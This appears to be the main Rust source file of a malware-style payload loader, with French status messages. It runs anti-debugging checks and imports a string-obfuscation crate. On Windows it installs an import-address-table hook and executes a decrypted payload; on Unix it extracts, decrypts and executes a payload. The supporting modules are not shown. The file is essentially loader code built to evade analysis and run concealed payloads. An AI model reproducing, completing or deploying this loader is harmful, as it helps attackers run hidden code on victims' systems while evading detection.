#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use obfstr::obfstr;
mod anti_debug;
mod config;
mod payload;
mod loader;
mod utils;
mod cypher;

#[cfg(windows)]
#[link(name = "kernel32")]
extern "system" {
    fn Beep(dwFreq: u32, dwDuration: u32) -> i32;
}

fn main() {
    let corrupted_mode = anti_debug::run_all_checks();
	//let corrupted_mode = false;
    #[cfg(windows)]
    {
		unsafe {
			let hook = loader::windows::iat::swap_iat();
			if hook {
				println!("Hook IAT installé avec succès !");
				loader::windows::iat::CORRUPTED_FLAG = corrupted_mode;
				Beep(440, 500);
				if let Some(payload) = payload::DECRYPTED_CACHE.take() {
					loader::execute(payload);
				} else {
					println!("[-] Payload introuvable !");
				}
			}
			else {
				println!("echec du hook");
			}
		}
    }

    #[cfg(unix)]
    {
       if let Some(decrypted_payload) = payload::extract_and_decrypt(corrupted_mode) {
			loader::execute(decrypted_payload);
		} else {
			println!("[-] Payload introuvable !");
		}
    }

    
}